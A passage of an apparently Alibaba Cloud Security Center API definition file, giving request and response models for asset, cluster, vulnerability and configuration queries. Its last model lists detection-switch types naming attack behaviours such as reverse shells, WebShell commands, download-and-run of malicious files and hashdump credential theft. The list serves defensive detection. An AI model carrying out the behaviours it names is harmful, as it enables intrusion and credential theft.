  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='0DFCADBA-7065-42DA-AF17-6868B9C2A8CF'),
  totalCount?: int32(name='TotalCount', description='The total number of entries returned.', example='100'),
}

model DescribeCheckWarningsResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DescribeCheckWarningsResponseBody(name='body'),
}

async function describeCheckWarnings(request: DescribeCheckWarningsRequest): DescribeCheckWarningsResponse {
  @handler.validateRequestModel(request);
  return @handler.do('RPC', 'DescribeCheckWarnings', 'POST', '/', 'json', false, 'json', request);
}

model DescribeClientConfSetupRequest {
  strategyTag: string(name='StrategyTag', description='The tag that is added to the server.', example='machineResource', position='Query'),
  strategyTagValue: string(name='StrategyTagValue', description='The value of the tag. Valid values:

*   major
*   advanced
*   basic', example='major', position='Query'),
}

model DescribeClientConfSetupResponseBody = {
  clientConf?: {
    config?: string(name='Config', description='The configurations of the usage for the Security Center agent.', example='{"mem":"200","cpu":"10","cpu_all":"0"}'),
    strategyTag?: string(name='StrategyTag', description='The tag that is added to the configuration.', example='machineResource'),
    strategyTagValue?: string(name='StrategyTagValue', description='The value of the tag. Valid values:

*   major
*   advanced
*   basic', example='major'),
  }(name='ClientConf', description='The configurations of the Security Center agent.'),
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='151F6EB6-D5F3-417A-AF7B-4D84975D****'),
}

model DescribeClientConfSetupResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DescribeClientConfSetupResponseBody(name='body'),
}

async function describeClientConfSetup(request: DescribeClientConfSetupRequest): DescribeClientConfSetupResponse {
  @handler.validateRequestModel(request);
  return @handler.do('RPC', 'DescribeClientConfSetup', 'POST', '/', 'json', false, 'json', request);
}

model DescribeClientConfStrategyRequest {
  tag: string(name='Tag', description='The tag that is added to the server.', example='machineResource', position='Query'),
  tagValue: string(name='TagValue', description='The value of the tag. Valid values:

*   major
*   advanced
*   basic', example='major', position='Query'),
}

model DescribeClientConfStrategyResponseBody = {
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='5BD95679-D63A-4151-97D0-188432F****'),
  targetList?: [ 
    {
      uuid?: string(name='Uuid', description='The UUID of the Security Center agent.', example='2b1753a6-04d9-448e-ad17-7abdf19f****'),
    }
  ](name='TargetList', description='An array that consists of the configurations.'),
  totalCount?: int32(name='TotalCount', description='The total number of entries returned.', example='100'),
}

model DescribeClientConfStrategyResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DescribeClientConfStrategyResponseBody(name='body'),
}

async function describeClientConfStrategy(request: DescribeClientConfStrategyRequest): DescribeClientConfStrategyResponse {
  @handler.validateRequestModel(request);
  return @handler.do('RPC', 'DescribeClientConfStrategy', 'POST', '/', 'json', false, 'json', request);
}

model DescribeCloudCenterInstancesRequest {
  criteria?: string(name='Criteria', description='The search conditions. The value of this parameter is in the JSON format and is case-sensitive.

>  You can search for an asset by using the search conditions, such as the instance ID, instance name, VPC ID, region, or public IP address. You can call the [DescribeCriteria](~~149773~~) operation to query the supported search conditions.', example='[{"name":"riskStatus","value":"YES"},{"name":"internetIp","value":"1.2.XX.XX"}]', position='Query'),
  currentPage?: int32(name='CurrentPage', description='The number of the page to return. Default value: **1**.', example='1', position='Query'),
  importance?: int32(name='Importance', description='The importance of the asset. Valid values:

*   **2**: an important asset
*   **1**: a common asset
*   **0**: a test asset', example='2', position='Query'),
  lang?: string(name='Lang', description='The language of the content within the request and response. Default value: **zh**. Valid values:

*   **zh**: Chinese
*   **en**: English', example='zh', position='Query'),
  logicalExp?: string(name='LogicalExp', description='The logical relationship among multiple search conditions. Valid values:

*   **OR**: The logical relationship among search conditions is **OR**.
*   **AND**: The logical relationship among search conditions is **AND**.', example='OR', position='Query'),
  machineTypes?: string(name='MachineTypes', description='The type of the assets that you want to query. Valid values:

*   **ecs**: servers
*   **cloud_product**: Alibaba Cloud service', example='ecs', position='Query'),
  nextToken?: string(name='NextToken', description='The value of NextToken that is returned when the NextToken method is used. You do not need to specify this parameter for the first request.', example='E17B501887A2D3AA5E8360A6EFA3B***', position='Query'),
  noGroupTrace?: boolean(name='NoGroupTrace', description='Specifies whether to internationalize the name of the default group. Valid values:

*   **true**: The system returns the Chinese name of the default group for the GroupTrace response parameter.
*   **false**: The system returns default for the GroupTrace response parameter.', example='false', position='Query'),
  pageSize?: int32(name='PageSize', description='The number of entries to return on each page. Default value: **20**.', example='100', position='Query'),
  regionId?: string(name='RegionId', description='The ID of the region in which the asset resides.', example='cn-hangzhou', position='Query'),
  resourceDirectoryAccountId?: long(name='ResourceDirectoryAccountId', description='The Alibaba Cloud account ID of the member in the resource directory.

>  You can call the [DescribeMonitorAccounts](~~DescribeMonitorAccounts~~) operation to obtain the IDs.', example='1232428423234****', position='Query'),
  useNextToken?: boolean(name='UseNextToken', description='Specifies whether to use the NextToken method to retrieve a new page of results. If you set UseNextToken to true, the value of TotalCount is not returned. Valid values:

- **true**: The NextToken method is used.
- **false**: The NextToken method is not used.', example='false', position='Query'),
}

model DescribeCloudCenterInstancesResponseBody = {
  instances?: [ 
    {
      alarmStatus?: string(name='AlarmStatus', description='Indicates whether alerts are generated on the asset. Valid values:

*   **YES**
*   **NO**', example='NO'),
      assetType?: string(name='AssetType', description='The type of the asset. Valid values:

*   **0**: an ECS instance
*   **1**: a Server Load Balancer (SLB) instance
*   **2**: a Network Address Translation (NAT) gateway
*   **3**: an ApsaraDB RDS instance
*   **4**: an ApsaraDB for MongoDB instance
*   **5**: an ApsaraDB for Redis instance
*   **6**: a container image
*   **7**: a container', example='ecs'),
      authModifyTime?: long(name='AuthModifyTime', description='The timestamp when Security Center is authorized to scan the asset.', example='1627974044000'),
      authVersion?: int32(name='AuthVersion', description='The edition of Security Center that is authorized to scan the asset. Valid values:

*   **1**: Basic edition
*   **6**: Anti-virus edition
*   **5**: Advanced edition
*   **3**: Enterprise edition
*   **7**: Ultimate edition
*   **10**: Value-added Plan edition', example='3'),
      authVersionName?: string(name='AuthVersionName', description='The name of the Security Center edition that is authorized to scan the asset. Valid values:

*   Basic edition
*   Anti-virus edition
*   Advanced edition
*   Enterprise edition
*   Ultimate edition
*   Value-added Plan edition', example='Ultimate Edition'),
      bind?: boolean(name='Bind', description='Indicates whether Security Center is authorized to scan the asset. Valid values:

*   **true**: Security Center is authorized to scan the asset.
*   **false**: Security Center is not authorized to scan the asset.', example='true'),
      clientStatus?: string(name='ClientStatus', description='The status of the Security Center agent installed on the asset. Valid values:

*   **online**: The Security Center agent is **enabled**.
*   **offline**: The Security Center agent is **disabled**.
*   **pause**: The Security Center agent is **suspended**.', example='online'),
      clusterId?: string(name='ClusterId', description='The ID of the cluster.', example='c690a0789419f4284a4e0a29e12fe****'),
      clusterName?: string(name='ClusterName', description='The name of the cluster.', example='cluster1'),
      cores?: int32(name='Cores', description='The number of the CPU cores used by the asset.', example='4'),
      cpuInfo?: string(name='CpuInfo', description='The CPU information about the asset.', example='Intel(R) Xeon(R) Platinum 8269CY CPU @ 2.50GHz'),
      createdTime?: long(name='CreatedTime', description='The timestamp when the cluster was created. Unit: milliseconds.', example='1607365213000'),
      exposedStatus?: int32(name='ExposedStatus', description='Indicates whether the asset is exposed. Valid values:

*   **0**: The asset is not exposed.
*   **1**: The asset is exposed.', example='0'),
      flag?: int32(name='Flag', description='Indicates whether the asset is an Alibaba Cloud asset. Valid values:

*   **0**: The asset is an Alibaba Cloud asset.
*   **1**: The asset is not an Alibaba Cloud asset.', example='0'),
      groupId?: long(name='GroupId', description='The ID of the asset group to which the asset belongs.', example='4120080'),
      groupTrace?: string(name='GroupTrace', description='The name of the group to which the asset belongs.', example='default'),
      hcStatus?: string(name='HcStatus', description='Indicates whether baseline risks are detected on the asset. Valid values:

*   **YES**
*   **NO**', example='YES'),
      healthCheckCount?: int32(name='HealthCheckCount', description='The number of baseline risks that are detected on the asset.', example='1'),
      importance?: int32(name='Importance', description='The importance of the asset. Valid values:

*   **2**: an important asset
*   **1**: a common asset
*   **0**: a test asset', example='2'),
      instanceId?: string(name='InstanceId', description='The ID of the asset.', example='i-m5***'),
      instanceName?: string(name='InstanceName', description='The name of the asset.', example='yztest-l***'),
      internetIp?: string(name='InternetIp', description='The public IP address of the asset.', example='1.2.XX.XX'),
      intranetIp?: string(name='IntranetIp', description='The private IP address of the asset.', example='1.2.XX.XX'),
      ip?: string(name='Ip', description='The public IP address of the asset.', example='1.2.XX.XX'),
      ipListString?: string(name='IpListString', description='The IP addresses of the system.', example='172.31.XX.XX,172.171.XX.XX'),
      kernel?: string(name='Kernel', description='The version of the kernel.', example='3.10.0-1127.19.1.el7.x86_64'),
      lastLoginTimestamp?: long(name='LastLoginTimestamp', description='The timestamp when the Security Center agent was last online. Unit: milliseconds.', example='1637592907000'),
      macListString?: string(name='MacListString', description='The MAC addresses of the system.', example='00:13:3e:31:13:39,02:12:67:b8:**:**'),
      mem?: int32(name='Mem', description='The size of the memory. Unit: MB.', example='1024'),
      os?: string(name='Os', description='The operating system of the asset.', example='Linux'),
      osName?: string(name='OsName', description='The kernel version of the asset.', example='-'),
      podCount?: int32(name='PodCount', description='The number of pods.', example='1'),
      region?: string(name='Region', description='The region ID of the asset.', example='cn-hangzhou-cm***-***'),
      regionId?: string(name='RegionId', description='The ID of the region in which the asset resides.', example='cn-hanghzou'),
      regionName?: string(name='RegionName', description='The name of the region in which the asset resides.', example='China (Hangzhou)'),
      riskCount?: string(name='RiskCount', description='The total number of baseline risks that are detected on the asset. The value of this parameter is in the JSON format and contains the following fields:

*   **account**: the number of accounts that are used to log on from unapproved logon locations and whose passwords are cracked
*   **appNum**: the number of scanners
*   **asapVulCount**: the total number of high-severity vulnerabilities
*   **baselineHigh**: the number of high-risk baseline risks
*   **baselineLow**: the number of low-risk baseline risks
*   **baselineMedium**: the number of medium-risk baseline risks
*   **baselineNum**: the total number of baseline risks
*   **cmsNum**: the number of Web-CMS vulnerabilities
*   **containerAsap**: the number of high-severity vulnerabilities that are detected on containers
*   **containerLater**: the number of medium-severity vulnerabilities that are detected on containers
*   **containerNntf**: the number of low-severity vulnerabilities that are detected on containers
*   **containerRemind**: the number of alerts whose Emergency level is Reminder on containers
*   **containerSerious**: the number of alerts Emergency level is Urgent on containers
*   **containerSuspicious**: the number of alerts whose Emergency level is Suspicious on containers
*   **cveNum**: the number of Linux software vulnerabilities
*   **emgNum**: the number of urgent vulnerabilities
*   **health**: the number of baseline alerts that are unhandled
*   **imageBaselineHigh**: the number of high-risk baseline risks that are detected on images
*   **imageBaselineLow**: the number of low-risk baseline risks that are detected on images
*   **imageBaselineMedium**: the number of medium-risk baseline risks that are detected on images
*   **imageBaselineNum**: the total number of baseline risks that are detected on images
*   **imageMaliciousFileRemind**: the number of malicious files that are detected on images and have the Emergency level of Reminder
*   **imageMaliciousFileSerious**: the number of malicious files that are detected on images and have the Emergency level of Urgent
*   **imageMaliciousFileSuspicious**: the number of malicious files that are detected on images and have the Emergency level of Suspicious
*   **imageVulAsap**: the number of high-severity vulnerabilities that are detected on images
*   **imageVulLater**: the number of medium-severity vulnerabilities that are detected on an image
*   **imageVulNntf**: the number of low-severity vulnerabilities that are detected on an image
*   **laterVulCount**: the number of medium-severity vulnerabilities
*   **newSuspicious**: the number of alerts
*   **nntfVulCount**: the number of low-severity vulnerabilities.
*   **remindNum**: the number of alerts whose Emergency level is Reminder
*   **scaNum**: the number of vulnerabilities that are detected based on software component analysis
*   **seriousNum**: the number of alerts whose Emergency level is Urgent
*   **suspNum**: the number of alerts whose Emergency level is Suspicious
*   **suspicious**: the total number of alerts
*   **sysNum**: the number of Windows system vulnerabilities
*   **trojan**: the number of trojans
*   **uuid**: the UUIDs of assets
*   **vul**: the number of vulnerabilities
*   **weakPWNum**: the number of weak passwords', example='{"account":0,"appNum":0,"asapVulCount":0,"baselineHigh":0,"baselineLow":0,"baselineMedium":0,"baselineNum":0,"cmsNum":0,"containerAsap":0,"containerLater":0,"containerNntf":0,"containerRemind":0,"containerSerious":0,"containerSuspicious":0,"cveNum":0,"emgNum":0,"health":0,"imageBaselineHigh":0,"imageBaselineLow":0,"imageBaselineMedium":0,"imageBaselineNum":0,"imageMaliciousFileRemind":0,"imageMaliciousFileSerious":0,"imageMaliciousFileSuspicious":0,"imageVulAsap":0,"imageVulLater":0,"imageVulNntf":0,"laterVulCount":0,"newSuspicious":0,"nntfVulCount":0,"remindNum":0,"scaNum":0,"seriousNum":0,"suspNum":0,"suspicious":0,"sysNum":0,"trojan":0,"uuid":"inet-37316411-37fe-4b72-b245-346a2721d4b6","vul":0,"weakPWNum":0}'),
      riskStatus?: string(name='RiskStatus', description='Indicates whether risks are detected on the asset. Valid values:

*   **YES**
*   **NO**', example='NO'),
      safeEventCount?: int32(name='SafeEventCount', description='The number of alerts that are generated on the asset.', example='5'),
      status?: string(name='Status', description='The status of the asset. Valid values:

*   **Running**: running
*   **notRunning**: stopped', example='Running'),
      tag?: string(name='Tag', description='The name of the asset tag.', example='InternetIp,test'),
      tagId?: string(name='TagId', description='The ID of the asset tag.', example='121313,41412'),
      uuid?: string(name='Uuid', description='The UUID of the asset.', example='c9107c04-942f-40c1-981a-f1c1***'),
      vendor?: int32(name='Vendor', description='The type of the asset by source. Valid values:

*   **0**: an ECS instance.
*   **1**: a third-party cloud server.
*   **2**: a server in a data center.
*   **3**: a server deployed on Tencent Cloud. This value is returned only after the asset is protected by Security Center.', example='0'),
      vendorName?: string(name='VendorName', description='The name of the service provider (SP) for the asset.

Valid values:

*   **TENCENT**: Tencent Cloud
*   **ALIYUN**: Alibaba Cloud', example='Tencent'),
      vpcInstanceId?: string(name='VpcInstanceId', description='The ID of the VPC to which the asset belongs.', example='vpc-uf60agqq65bs98zoo****'),
      vulCount?: int32(name='VulCount', description='The number of vulnerabilities that are detected on the asset.', example='2'),
      vulStatus?: string(name='VulStatus', description='Indicates whether vulnerabilities are detected on the asset. Valid values:

*   **YES**
*   **NO**', example='YES'),
    }
  ](name='Instances', description='An array that consists of the details about the asset.'),
  pageInfo?: {
    count?: int32(name='Count', description='The number of entries returned on the current page.', example='10'),
    currentPage?: int32(name='CurrentPage', description='The page number of the returned page.', example='1'),
    nextToken?: string(name='NextToken', description='The value of NextToken that is returned when the NextToken method is used.', example='B604532DEF982B875E8360A6EFA3B***'),
    pageSize?: int32(name='PageSize', description='The number of entries returned per page. Default value: **20**.', example='20'),
    totalCount?: int32(name='TotalCount', description='The total number of entries returned.', example='50'),
  }(name='PageInfo', description='The pagination information.'),
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='32A73759-4C0F-4801-BE98-901223ACEE9A'),
  success?: boolean(name='Success', description='Indicates whether the call is successful. Valid values:

*   **true**: The call is successful.
*   **false**: The call fails.', example='true'),
}

model DescribeCloudCenterInstancesResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DescribeCloudCenterInstancesResponseBody(name='body'),
}

/**
  * You can search for an asset by using search conditions, such as the instance ID, instance name, virtual private cloud (VPC) ID, region, and public IP address. You can also configure a logical relationship between multiple search conditions to search for the assets that meet the search conditions.
  *
 */
async function describeCloudCenterInstances(request: DescribeCloudCenterInstancesRequest): DescribeCloudCenterInstancesResponse {
  @handler.validateRequestModel(request);
  return @handler.do('RPC', 'DescribeCloudCenterInstances', 'POST', '/', 'json', false, 'json', request);
}

model DescribeCloudProductFieldStatisticsRequest {
}

model DescribeCloudProductFieldStatisticsResponseBody = {
  groupedFields?: {
    categoryCount?: string(name='CategoryCount', description='The statistics of different types of assets. **MachineType** indicates the type of the asset. **Count** indicates the number of assets of a specific type.

Valid values of **MachineType**:

*   **1**: Server Load Balancer (SLB) instance
*   **2**: NAT gateway instance
*   **3**: ApsaraDB RDS instance
*   **4**: ApsaraDB for MongoDB instance', example='[{"MachineType":1,"Count":11}]'),
    instanceCount?: int32(name='InstanceCount', description='The total number of cloud services that are protected by Security Center.', example='100'),
    riskInstanceCount?: int32(name='RiskInstanceCount', description='The number of cloud services that are at risk.', example='90'),
  }(name='GroupedFields', description='The statistics of cloud services that are protected by Security Center.'),
  requestId?: string(name='RequestId', description='The ID of the request.', example='7E0618A9-D5EF-4220-9471-C42B5E92719F'),
}

model DescribeCloudProductFieldStatisticsResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DescribeCloudProductFieldStatisticsResponseBody(name='body'),
}

async function describeCloudProductFieldStatistics(request: DescribeCloudProductFieldStatisticsRequest): DescribeCloudProductFieldStatisticsResponse {
  @handler.validateRequestModel(request);
  return @handler.do('RPC', 'DescribeCloudProductFieldStatistics', 'POST', '/', 'json', false, 'json', request);
}

model DescribeClusterBasicInfoRequest {
  clusterId: string(name='ClusterId', description='The ID of the cluster that you want to query.

> You can call the [DescribeGroupedContainerInstances](~~DescribeGroupedContainerInstances~~) operation to query the IDs of clusters.', example='c870ec78ecbcb41d2a35c679823ef****', position='Query'),
  targetType: string(name='TargetType', description='The dimension from which you want to configure the feature. Valid values:

*   **Cluster**: the ID of the cluster', example='Cluster', position='Query'),
  type: string(name='Type', description='The type of the feature. Valid values:

*   **containerNetwork**: container network topology
*   **interceptionSwitch**: cluster microsegmentation', example='containerNetwork', position='Query'),
}

model DescribeClusterBasicInfoResponseBody = {
  clusterInfo?: {
    clusterId?: string(name='ClusterId', description='The ID of cluster.', example='c870ec78ecbcb41d2a35c679823ef****'),
    clusterName?: string(name='ClusterName', description='The name of the cluster.', example='testackpro'),
    clusterType?: string(name='ClusterType', description='The type of the cluster. Valid values:

*   **ManagedKubernetes**: managed Kubernetes cluster
*   **NotManagedKubernetes**: non-managed Kubernetes cluster
*   **PrivateKubernetes**: private cluster
*   **kubernetes**: dedicated Kubernetes cluster
*   **ask**: dedicated ASK cluster', example='kubernetes'),
    createTime?: long(name='CreateTime', description='The timestamp when the cluster was created. Unit: milliseconds.', example='1662038134000'),
    currentVersion?: string(name='CurrentVersion', description='The version of the cluster.', example='1.22.10-aliyun.1'),
    instanceCount?: int32(name='InstanceCount', description='The number of instances in the cluster.', example='10'),
    regionId?: string(name='RegionId', description='The ID of the region in which the cluster is deployed.', example='cn-hangzhou'),
    state?: string(name='State', description='The status of the cluster. Valid values:

*   **unavailable**
*   **Available**
*   **Creating**
*   **CreateFailed**', example='Available'),
    targetResult?: boolean(name='TargetResult', description='Indicates whether the cluster is enabled. Valid values:

*   **true**: The cluster is enabled.
*   **false**: The cluster is disabled.', example='true'),
  }(name='ClusterInfo', description='The detailed information about the cluster.'),
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='24A20733-10A0-4AF6-BE6B-E3322413BB68'),
}

model DescribeClusterBasicInfoResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DescribeClusterBasicInfoResponseBody(name='body'),
}

async function describeClusterBasicInfo(request: DescribeClusterBasicInfoRequest): DescribeClusterBasicInfoResponse {
  @handler.validateRequestModel(request);
  return @handler.do('RPC', 'DescribeClusterBasicInfo', 'POST', '/', 'json', false, 'json', request);
}

model DescribeClusterInfoListRequest {
  target?: string(name='Target', description='The operation value. The value specifies the ID of the cluster.', example='c23551de6149343e8a54e69fbefe6****', position='Query'),
  targetType: string(name='TargetType', description='The dimension based on which you want to configure the feature. Valid values:

*   **Cluster**: the ID of the cluster', example='Cluster', position='Query'),
  type: string(name='Type', description='The type of the feature. Valid values:

*   **containerNetwork**: container network
*   **interceptionSwitch**: cluster microsegmentation', example='containerNetwork', position='Query'),
}

model DescribeClusterInfoListResponseBody = {
  clusterList?: [ 
    {
      clusterId?: string(name='ClusterId', description='The ID of the container cluster.', example='cfeb7a9f99ce740e98c5595d0fe37****'),
      clusterName?: string(name='ClusterName', description='The name of the container cluster.', example='test111'),
      clusterType?: string(name='ClusterType', description='The type of the cluster. Valid values:

*   **ManagedKubernetes**: managed Kubernetes cluster.
*   **NotManagedKubernetes**: non-managed Kubernetes cluster.
*   **PrivateKubernetes**: private cluster.
*   **kubernetes**: dedicated Kubernetes cluster.
*   **ask**: dedicated serverless Kubernetes (ASK) cluster.', example='ManagedKubernetes'),
      regionId?: string(name='RegionId', description='The region in which the cluster resides.', example='cn-hangzhou'),
      state?: string(name='State', description='The status of the cluster. Valid values:

*   **unavailable**: The cluster is unavailable.
*   **Available**: The cluster is available.
*   **Creating**: The cluster is being created.
*   **CreateFailed**: The cluster failed to be created.', example='Available'),
      targetResult?: boolean(name='TargetResult', description='Indicates whether container network topology was enabled. Valid values:

*   **true**
*   **false**', example='true'),
    }
  ](name='ClusterList', description='An array that consists of the information about clusters.'),
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='7E0618A9-D5EF-4220-9471-C42B5E92719F'),
}

model DescribeClusterInfoListResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DescribeClusterInfoListResponseBody(name='body'),
}

async function describeClusterInfoList(request: DescribeClusterInfoListRequest): DescribeClusterInfoListResponse {
  @handler.validateRequestModel(request);
  return @handler.do('RPC', 'DescribeClusterInfoList', 'POST', '/', 'json', false, 'json', request);
}

model DescribeClusterNetworkRequest {
  endTime: long(name='EndTime', description='The end timestamp of the query. Unit: milliseconds.

> The days between the start timestamp and the end timestamp cannot exceed **seven** days.', example='1656038940435', position='Query'),
  startTime: long(name='StartTime', description='The start timestamp of the query. Unit: milliseconds.

> The days between the start timestamp and the end timestamp cannot exceed **seven** days.', example='1656038740435', position='Query'),
}

model DescribeClusterNetworkResponseBody = {
  clusterNetwork?: {
    edge?: [ 
      {
        dstNodeId?: string(name='DstNodeId', description='The ID of the destination node.', example='cfb41a869c71e4678a97021582dd8****'),
        dstNodeType?: string(name='DstNodeType', description='The type of the destination node. Valid values:

*   Set the value to **cluster**.', example='cluster'),
        id?: string(name='Id', description='The ID of the topology edge.', example='1'),
        port?: string(name='Port', description='The port number of the topology edge.', example='6164'),
        srcNodeId?: string(name='SrcNodeId', description='The ID of the source node.', example='cfb41a869c71e4678a97021582dd8****'),
        srcNodeType?: string(name='SrcNodeType', description='The type of the source node. Valid values:

*   **cluster**: a cluster.
*   **internet**: a network node outside the cluster', example='cluster'),
      }
    ](name='Edge', description='An array that consists of information about the topology edge.'),
    node?: [ 
      {
        cnnfSwitch?: int32(name='CnnfSwitch', description='The status of the microsegmentation switch. Valid values:

*   **0**: off.
*   **1**: on.', example='1'),
        id?: string(name='Id', description='The ID of the node.', example='cfeb7a9f99ce740e98c5595d0fe37****'),
        interceptionType?: int32(name='InterceptionType', description='The network type. Valid values:

*   **0**: classic network.
*   **1**: virtual private cloud (VPC).', example='1'),
        name?: string(name='Name', description='The name of the node.', example='testwww'),
        netTopoSwitch?: string(name='NetTopoSwitch', description='The status of the network topology switch. Valid values:

*   **ON**
*   **OFF**', example='ON'),
        riskLevel?: string(name='RiskLevel', description='The risk level. Valid values:

*   **3**: high.
*   **2**: medium.
*   **1**: low.
*   **0**: secure.
*   **-1**: unknown.', example='3'),
        type?: string(name='Type', description='The type of the node. Valid values:

*   **cluster**: a cluster.
*   **internet**: a network node outside the cluster.', example='cluster'),
      }
    ](name='Node', description='An array that consists of information about the node.'),
  }(name='ClusterNetwork', description='Information about the network topology edge in the cluster.'),
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='C286491D-4A2F-589A-B63B-D2AD3DA9BD71'),
}

model DescribeClusterNetworkResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DescribeClusterNetworkResponseBody(name='body'),
}

async function describeClusterNetwork(request: DescribeClusterNetworkRequest): DescribeClusterNetworkResponse {
  @handler.validateRequestModel(request);
  return @handler.do('RPC', 'DescribeClusterNetwork', 'POST', '/', 'json', false, 'json', request);
}

model DescribeClusterVulStatisticsRequest {
  clusterId?: string(name='ClusterId', description='The ID of the container cluster.', example='c471f0f61b9c04f8380556e922cf1****', position='Query'),
  types?: string(name='Types', description='The type of the vulnerabilities. Valid values:

*   **cve**: Linux software vulnerabilities
*   **app**: application vulnerabilities
*   **sca**: vulnerabilities that are detected based on software component analysis', example='cve,app,sca', position='Query'),
}

model DescribeClusterVulStatisticsResponseBody = {
  requestId?: string(name='RequestId', description='The ID of the request.', example='0B48AB3C-84FC-424D-A01D-B9270EF46038'),
  vulStat?: {
    asapCount?: string(name='AsapCount', description='The number of high-risk vulnerabilities.', example='13'),
    laterCount?: string(name='LaterCount', description='The number of medium-risk vulnerabilities.', example='21'),
    nntfCount?: string(name='NntfCount', description='The number of low-risk vulnerabilities.', example='0'),
  }(name='VulStat', description='The statistics of the vulnerabilities.'),
}

model DescribeClusterVulStatisticsResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DescribeClusterVulStatisticsResponseBody(name='body'),
}

async function describeClusterVulStatistics(request: DescribeClusterVulStatisticsRequest): DescribeClusterVulStatisticsResponse {
  @handler.validateRequestModel(request);
  return @handler.do('RPC', 'DescribeClusterVulStatistics', 'POST', '/', 'json', false, 'json', request);
}

model DescribeCommonOverallConfigRequest {
  sourceIp?: string(name='SourceIp', description='The source IP address of the request.', example='59.61.XX.XX', position='Query'),
  type: string(name='Type', description='The type of the feature. Valid values:

*   **kdump_switch**: Active defense experience optimization
*   **threat_detect**: Dynamic adaptive threat detection capability
*   **suspicious_aggregation**: Alert Association
*   **alidetect**: File Test
*   **USER-ENABLE-SWITCH-TYPE\\_3277**: Suspicious process startup
*   **USER-ENABLE-SWITCH-TYPE\\_5507**: malicious drivers
*   **USER-ENABLE-SWITCH-TYPE\\_38857**: Entrance service execution high-risk operation
*   **USER-ENABLE-SWITCH-TYPE\\_50858**: Web service performs high-risk operations
*   **USER-ENABLE-SWITCH-TYPE\\_50859**: Entrance service execution suspicious operation
*   **USER-ENABLE-SWITCH-TYPE\\_50861**: Information detection
*   **USER-ENABLE-SWITCH-TYPE\\_50862**: Cloud Assistant Advanced Protection
*   **USER-ENABLE-SWITCH-TYPE\\_50867**: Create malicious files
*   **USER-ENABLE-SWITCH-TYPE\\_50868**: Create suspicious files
*   **USER-ENABLE-SWITCH-TYPE\\_50869**: Unauthorized execution of high-risk orders
*   **USER-ENABLE-SWITCH-TYPE\\_50870**: Rebound Shell
*   **USER-ENABLE-SWITCH-TYPE\\_50873**: WebShell execute command
*   **USER-ENABLE-SWITCH-TYPE\\_50876**: Against security software
*   **USER-ENABLE-SWITCH-TYPE\\_50877**: Malicious soft communication
*   **USER-ENABLE-SWITCH-TYPE\\_50884**: Suspicious worm script behavior
*   **USER-ENABLE-SWITCH-TYPE\\_50885**: malicious script behavior
*   **USER-ENABLE-SWITCH-TYPE\\_50983**: obfuscated command
*   **USER-ENABLE-SWITCH-TYPE\\_51200**: Command line download and run malicious files
*   **USER-ENABLE-SWITCH-TYPE\\_51201**: ransomware
*   **USER-ENABLE-SWITCH-TYPE\\_51202**: Suspected Extortion
*   **USER-ENABLE-SWITCH-TYPE\\_53168**: process debugging
*   **USER-ENABLE-SWITCH-TYPE\\_53272**: Exploiting Kernel Vulnerabilities to Elevate Privileges
*   **USER-ENABLE-SWITCH-TYPE\\_54034**: Intranet scan
*   **USER-ENABLE-SWITCH-TYPE\\_54265**: Hijacking the PAM Module
*   **USER-ENABLE-SWITCH-TYPE\\_54395**: Unauthorized reading and writing of sensitive files
*   **USER-ENABLE-SWITCH-TYPE\\_54699**: Hijack dynamic link library
*   **USER-ENABLE-SWITCH-TYPE\\_54953**: Hashdump Attack
*   **USER-ENABLE-SWITCH-TYPE\\_57897**: suspected privilege escalation
*   **USER-ENABLE-SWITCH-TYPE\\_62981**: Bypassing security monitoring
*   **USER-ENABLE-SWITCH-TYPE\\_64025**: Ingress service execute command \\[enhanced mode]
*   **USER-ENABLE-SWITCH-TYPE\\_39659**: Sensitive Registry Key Protection
*   **USER-ENABLE-SWITCH-TYPE\\_51225**: Powershell executes high-risk commands
*   **USER-ENABLE-SWITCH-TYPE\\_51226**: Powershell execute suspicious command
*   **USER-ENABLE-SWITCH-TYPE\\_51228**: High-risk lateral penetration tools
*   **USER-ENABLE-SWITCH-TYPE\\_51229**: Browser service execution a high-risk operation
*   **USER-ENABLE-SWITCH-TYPE\\_51230**: Entrance service execution suspicious operation
*   **USER-ENABLE-SWITCH-TYPE\\_51232**: System processes execution high-risk operations
*   **USER-ENABLE-SWITCH-TYPE\\_51233**: Java service execution high-risk operations
*   **USER-ENABLE-SWITCH-TYPE\\_51234**: Office components execution high-risk operations
*   **USER-ENABLE-SWITCH-TYPE\\_51235**: Web service performs high-risk operations
*   **USER-ENABLE-SWITCH-TYPE\\_51236**: Rebound shells
*   **USER-ENABLE-SWITCH-TYPE\\_52815**: Load high-risk drivers
*   **USER-ENABLE-SWITCH-TYPE\\_52816**: high-risk account manipulation behavior
*   **USER-ENABLE-SWITCH-TYPE\\_52818**: Information detection
*   **USER-ENABLE-SWITCH-TYPE\\_52820**: Create malicious files
*   **USER-ENABLE-SWITCH-TYPE\\_52821**: Suspicious process startup
*   **USER-ENABLE-SWITCH-TYPE\\_52823**: Running high-risk ARK tools
*   **USER-ENABLE-SWITCH-TYPE\\_52825**: Unauthorized execution of high-risk orders
*   **USER-ENABLE-SWITCH-TYPE\\_52826**: Entrance service execution high-risk operation
*   **USER-ENABLE-SWITCH-TYPE\\_52827**: Ransomware
*   **USER-ENABLE-SWITCH-TYPE\\_52828**: Suspected Extortion
*   **USER-ENABLE-SWITCH-TYPE\\_52829**: delete system backup behavior
*   **USER-ENABLE-SWITCH-TYPE\\_54168**: LSA security permission service protection
